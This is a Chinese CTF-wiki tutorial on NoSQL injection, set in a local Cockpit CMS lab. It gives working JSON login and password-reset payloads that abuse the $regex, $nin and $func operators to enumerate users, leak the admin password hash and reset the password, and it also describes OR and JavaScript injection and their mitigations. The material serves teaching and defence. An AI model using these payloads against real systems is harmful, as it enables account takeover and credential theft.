# NOSQL注入
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



在网络攻击方法中，SQL注入一直是最流行的攻击之一，随着NoSQL数据库，如MongoDB、Redis的出现，传统的SQL注入不再可行。但是这并不意味着NoSQL数据库就百分百安全。NoSQL注入漏洞第一次由Diaspora在2010年发现，到现在，NoSQL注入和SQL注入一样，如果开发者不注重，同样会对企业服务器造成致命威胁

本着学习调试方法的态度，来在本地做一个测试，使用到的是CockpitCMS.

## 部署

dockerfile:

```
FROM php:7.3-apache

RUN apt-get update \
    && apt-get install -y \
        wget zip unzip \
        libzip-dev \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        libpng-dev \
        sqlite3 libsqlite3-dev \
        libssl-dev \
    && pecl install mongodb \
    && pecl install redis \
    && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \
    && docker-php-ext-install -j$(nproc) iconv gd pdo zip opcache pdo_sqlite \
    && a2enmod rewrite expires

RUN echo "extension=mongodb.so" > /usr/local/etc/php/conf.d/mongodb.ini
RUN echo "extension=redis.so" > /usr/local/etc/php/conf.d/redis.ini

RUN chown -R www-data:www-data /var/www/html

VOLUME /var/www/html

CMD ["apache2-foreground"]
```

`https://github.com/agentejo/cockpit`

依次执行以下的命令

```
docker build -t cockpit .
docker ps
docker run -i -p 8080:80 -d ImigeID
docker exec -it containerID /bin/bash #到这一步之后应该是已经进入了docker虚拟机内
apt-get install git
git clone https://github.com/agentejo/cockpit
ls
cd cockpit/
chmod -R 777 *  #改权限，不然会提示报错
```

![1](nosql注入.assets/1.png)





之后访问`http://127.0.0.1:8080/cockpit/install`提示安装完成并给了我们初始进入账号密码admin/admin

访问

```
http://127.0.0.1:8080/cockpit/auth/login?to=/index.php
```

进入登录界面：

![2](nosql注入.assets/2.png)

## /auth/check

打开burpsuite,抓取一个POST包

将POST内容改为：

```
{"auth":{"user":{"$eq":"admin"},"password":[0]},"csrf":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoibG9naW4ifQ.v9zlTboG-wFROPUcWj5kSE07IvKkz0IMjiIU0q9ZLR0"}、
```

得到回显：

![3](nosql注入.assets/3.png)

ps:由于漏洞被修复的原因，你需要进入cockpit/modules/Cockpit/Controller/Auth.php删掉第一个分支过滤：

![4](nosql注入.assets/4.png)

然后我们再来看看位于/cockpit/moudles/Cockpit/module/auth.php的源代码：

```php
<?php
/**
 * This file is part of the Cockpit project.
 *
 * (c) Artur Heinze - 🅰🅶🅴🅽🆃🅴🅹🅾, http://agentejo.com
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

// Auth Api
$this->module('cockpit')->extend([

    'authenticate' => function($data) use($app) {

        $data = array_merge([
            'user'     => '',
            'email'    => '',
            'group'    => '',
            'password' => ''
        ], $data);

        if (!$data['password']) return false;

        $filter = ['active' => true];

        if ($data['email']) {
            $filter['email'] = $data['email'];
        } else {
            $filter['user'] = $data['user'];
        }

        $user = $app->storage->findOne('cockpit/accounts', $filter);

        if ($user && password_verify($data['password'], $user['password'])) {

            $user = array_merge($data, (array)$user);

            unset($user['password']);

            return $user;
        }

        return false;
    }
    以下省略...........

```

**在`modules/Cockpit/module/auth.php`文件的第33行，首先，程序会查找用户是否存在用户是否存在，只有在用户存在的情况下，才会执行第35行if条件句中的`password_verify()`逻辑（`&&`运算符是短路求值，或者说是惰性求值）。所以如果返回的结果是password_verify() expects parameter 1 to be string，则说明，`$user = admin`在数据库中是存在的，`$app->storage->findOne()`成功返回了查询结果。**

*而上述漏洞的关键点在于，$filter['user']从$data['user']获取到之后，在被传入$app->storage->findOne进行数据库查询之前，完全没有经过过滤。因此，我们可以通过MongoDB操作符来进行NoSQL 注入。*(就是刚才删除的那一部分)

### $eq

`$eq`表示equal。是MongoDB中的比较操作符。

语法：

```json
{
    <field>: { $eq: <value> }
}
```

### $regex

`$regex`是MongoDB的正则表达式操作符，用来设置匹配字符串的正则表达式。`$regex`操作符是在MongoDB盲注中最经常被使用的，我们可以借助它来一个一个字符地爆破数据库。

语法：

```json
{
    <field>: { $regex: /pattern/, $options: '<options>' } 
}
{
    <field>: { $regex: 'pattern', $options: '<options>' }
}
{
    <field>: { $regex: /pattern/<options>}
}
```

其中`<options>`是模式修正符，在MongoDB中包含`i`，`m`，`x`和`s`四个选项。

我们可以用`$regex`进行盲注，来猜测用户名，比如：

```
POST /cockpit/auth/check HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Content-Length: 169
Connection: close

{
    "auth":{
        "user":{
            "$regex": "a.*"
        },
        "password":[
            0
        ]
    },
    "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
}
```

![5](nosql注入.assets/5.png)

说明用户名以`a`开头的用户存在。

`"$regex": "ab.*"`：

![6](nosql注入.assets/6.png)

以`ab`开头的用户不存在，那返回的信息自然是**User not found**。

### $nin

`$nin`表示查询时不匹配数组中的值，语法：

```
{
    field: { $nin: [ <value1>, <value2>, ..., <valueN> ] }
}
```

payload：

```
{
    "auth":{
        "user":{
            "$nin": [
                "admin",
                "Poseidon",
                "Sirens"
            ],
            "$regex": "Co.*"
        },
        "password":[
            0
        ]
    },
    "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
}
```

### 自定义$func/$fn/$f 操作符

在Cockpit的**lib/MongoLite/Database.php**的[`evaluate`](https://github.com/agentejo/cockpit/blob/0d01412e1209468c23f0f4c49eccf959059e415e/lib/MongoLite/Database.php#L432)函数中重写和新增很多MongoDB操作符，其中`$func`、`$fn`和`$f`操作符比较有意思，因为该操作符允许调用callable PHP函数：

![img](nosql注入.assets/t0179c40915ee4f309d.png)

`$func`操作符并不是MongoDB中定义的标准操作符，在Cockpit CMS中，该操作符可以调用任何带有单个参数的PHP标准函数，其中`$b`是我们可控的。

所以我们可以构造这样的payload：

```
{
    "auth":{
        "user":{
            "$func":"var_dump"
        },
        "password":[
            0
        ]
    },
    "csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
}
```

https://github.com/agentejo/cockpit/blob/0d01412e1209468c23f0f4c49eccf959059e415e/lib/MongoLite/Database.php#L432

代码👆

之后的漏洞，大同小异，都是因为过滤出现问题导致的Nosql注入，直接开始搬运。

## /auth/requestreset

在忘记登录密码的情况下，Cockpit提供了密码重置功能，相关逻辑在`modules/Cockpit/Controller/Auth.php`中，和登录逻辑一样，传入`$this->app->storage->findOne()`进行查询的参数`$query`完全没有经过处理：

[![img](nosql注入.assets/t017786a70a1d30b516.png)](https://p1.ssl.qhimg.com/t017786a70a1d30b516.png)

在这里，我们可以用相同的方法来获取用户名：

```
POST /cockpit/auth/requestreset HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://your-ip:8000/cockpit/auth/forgotpassword
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Content-Length: 33
Connection: close
Cookie: 8071dec2be26139e39a170762581c00f=e0050af94b1d4e88d31e7695c2b5142a

{
    "user":{
        "$func":"var_dump"
    }
}
```

[![img](nosql注入.assets/t014461813a33f98bb1.png)](https://p0.ssl.qhimg.com/t014461813a33f98bb1.png)

 

## /auth/resetpassword

从前面的两处漏洞，已经可以得到后台的用户账户名了。接着我们可以利用漏洞3重置密码。

重置密码功能处理函数为`resetpassword()`，位于文件`modules/Cockpit/Controller/Auth.php`：

[![img](nosql注入.assets/t01b84f5814516b749c.png)](https://p2.ssl.qhimg.com/t01b84f5814516b749c.png)

在第150行，`$token`参数被传入查询之前，没有经过过滤净化，同样，在这样存在一个相同的漏洞：

```
{
    "token":{
        "$func":"var_dump"
    }
}
```

[![img](nosql注入.assets/t012f476bf851afd605.png)](https://p1.ssl.qhimg.com/t012f476bf851afd605.png)

 

## /auth/newpassword

无独有偶，在同文件的`newpassword`中，同样没有对`$token`参数做净化：

[![img](nosql注入.assets/t01d707f4153f8dc780.png)](https://p3.ssl.qhimg.com/t01d707f4153f8dc780.png)

同样存在NoSQL注入漏洞：

[![img](nosql注入.assets/t011d964bf0b864404d.png)](https://p1.ssl.qhimg.com/t011d964bf0b864404d.png)

### 获取用户密码

当获取了正确了`$token`之后，重新请求`auth/newpassword`：

```
POST /cockpit/auth/newpassword HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Content-Length: 60
Connection: close

{
    "token":"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b"
}
```

[![img](nosql注入.assets/t012a96740d37070320.png)](https://p0.ssl.qhimg.com/t012a96740d37070320.png)

可以看到，我们得到了admin用户的邮箱信息和hash之后的密码！

hash值`$2y$10$IkeINxb9VlaZUJ5jwyBNdO\/x8QFlCd1UO8zLiZExGDLVFVJtjyoz6`是用PHP built-in加密函数`password_hash`加密的。如果你有足够大的密码库，我们也可以暴力破解。

### 重置用户密码

如果你没有那么多时间或是设备破解密码，我们可以借助`resetpassword`中的漏洞来直接重置密码：

```
{
    "token":"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b",
    "password":"123456hahha"
}
```

[![img](nosql注入.assets/t01ea39f0305fff5cd3.png)](https://p4.ssl.qhimg.com/t01ea39f0305fff5cd3.png)

密码重置成功！

## NoSQL注入其他方法

*初学阶段，来自搬运*

（1）PHP数组注入

（2）MongoDB OR注入

（3）任意JavaScript注入

### MongoDB OR注入

SQL注入漏洞的一个常见原因是从字符串文本构建查询，其中包括未使用适当编码的用户输入。虽然这种注入方式因为JSON查询而变得更难实现，但是也不是完全没有可能的。

一些开发者可能采取这样的方式将用户输入转成JSON，而不是使用PHP自带的array函数：

[![img](nosql注入.assets/t01af6f16e1cf254ea4.png)](https://p1.ssl.qhimg.com/t01af6f16e1cf254ea4.png)

在正常情况下，拼接后可以得到：

```json‘
{ username: 'tolkien', password: 'hobbit' }
```

如果攻击者构造这样的恶意输入：

[![img](nosql注入.assets/t018dc8990f7bfbcc60.png)](https://p3.ssl.qhimg.com/t018dc8990f7bfbcc60.png)

拼接后的结果为：

[![img](nosql注入.assets/t01515ca8f5019af267.png)](https://p3.ssl.qhimg.com/t01515ca8f5019af267.png)

`$or`就表示对后面的`[]`中的内容进行OR语句操作，而一个`{}`查询语句永远返回`TRUE`。

所以这条语句就相当于：

```sql
SELECT * FROM logins WHERE username = 'tolkien' AND (TRUE OR ('a' = 'a' AND password = '')) #successful MongoDB injection
```

只要用户能够提供正确的用户名就可以直接登录，而不需要密码校验。

### NoSQL JavaScript注入

NoSQL数据库的另一个特性是可以执行JavaScript语句。如果用户的输入为转义或未充分转义，则Javascript执行会暴露一个危险的攻击面。 例如，一个复杂的事物可能需要javascript代码，其中包括一个未转义的用户输入作为查询中的一个参数。

比如以一个商店为例，商店中有一系列商品，每个商品都有价格和金额。开发人员想要获取这些字段的总和或者平均值，开发者编写了一个map reduce函数，其中`$param`参数接受用户的输入：

[![img](nosql注入.assets/t01116f30e79253d8ad.png)](https://p0.ssl.qhimg.com/t01116f30e79253d8ad.png)

因为没有对用户的输入进行充分的过滤，所以攻击者可以构造这样的payload：

[![img](nosql注入.assets/t01a3abdc4d02e502d9.png)](https://p4.ssl.qhimg.com/t01a3abdc4d02e502d9.png)

上面代码中绿色的部分的作用是闭合function()函数；红色的部分是攻击者希望执行的任意代码。最后最一部分蓝色的代码调用一个新的map reduce函数，以平衡注入到原始语句中的代码。

得到的效果为：

[![img](nosql注入.assets/t01cbc734f0cacde9f3.png)](https://p3.ssl.qhimg.com/t01cbc734f0cacde9f3.png)

如果要防止JavaScript注入攻击，可以直接禁止数据库语句中JavaScript语句的执行（在*mongod.conf*中将`javascriptEnabled`设为`false`）或者是**加强对用户输入的过滤**。

### 缓解与检测

我们可以看到的是，无论哪种类型的注入方法，它们的防御或者说是缓解措施，最重要的一点就是，永远不要无条件相信用户的输入，对于来自外部的输入，一定要小心小心再小心。